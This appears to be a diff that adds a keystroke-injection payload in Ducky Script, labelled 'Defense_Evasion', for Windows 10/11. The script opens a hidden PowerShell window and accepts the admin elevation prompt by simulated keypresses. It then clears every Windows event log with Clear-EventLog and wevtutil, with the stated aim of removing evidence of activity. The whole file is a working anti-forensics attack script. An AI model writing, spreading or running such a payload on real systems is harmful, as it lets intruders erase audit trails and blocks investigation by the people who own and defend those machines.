@@ -1,0 +1,25 @@
+REM Author: UNC0V3R3D
+REM Description: Clears all Windows event logs to remove evidence of activity. Requires admin.
+REM Version: 1.0
+REM Category: Defense_Evasion
+REM Target: Windows 10/11
+REM Requirements: Admin privileges
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 2000
+STRING Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log -ErrorAction SilentlyContinue }
+ENTER
+DELAY 3000
+STRING wevtutil el | ForEach-Object { wevtutil cl $_ }
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+REM End of payload
